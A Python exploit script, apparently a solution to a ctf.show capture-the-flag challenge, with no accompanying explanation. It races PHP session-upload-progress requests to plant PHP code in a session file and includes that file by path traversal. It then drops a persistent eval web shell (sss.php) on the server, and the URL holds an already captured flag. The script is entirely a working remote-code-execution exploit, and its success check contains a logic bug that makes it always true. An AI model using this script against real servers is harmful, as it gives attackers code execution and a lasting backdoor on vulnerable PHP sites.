import requests
import io
import threading

url = "http://55980530-8d32-4d76-9281-5537e5fdf252.challenge.ctf.show/system36d/util/common.php?k=flag_651=ctfshow{a4c64b86d754b3b132a138e3e0adcaa6}"
url2 = "http://55980530-8d32-4d76-9281-5537e5fdf252.challenge.ctf.show/index.php"
sessionid = "na0h"
data = {
    'key': 'key_is_here_you_know',
    'file': '../../../../../tmp/sess_' + sessionid,
    # /var/www/html/system36d/util/dbutil.php
    '1': '''file_put_contents('sss.php','<?php eval($_POST[1]);?>');'''
}


def write(session):
    filebytes = io.BytesIO(b'a' * 1024 * 50)
    while True:
        resp = session.post(url2,
                            data={'PHP_SESSION_UPLOAD_PROGRESS': '<?php eval($_POST[1]);?>'},
                            files={'file': ('na0h.png', filebytes)},
                            cookies={'PHPSESSID': sessionid})
        print("[*]writing...")


def read(session):
    while True:
        resp = session.post(url, data=data, cookies={'PHPSESSID': sessionid})
        if 'na0h.png' or 'offset: 1' in resp.text:
            print(resp.text)
            event.clear()
        else:
            print("[*]status:" + str(resp.status_code))


if __name__ == "__main__":
    event = threading.Event()
    with requests.session() as session:
        for i in range(5):
            threading.Thread(target=write, args=(session,)).start()
        for i in range(5):
            threading.Thread(target=read, args=(session,)).start()
    event.set()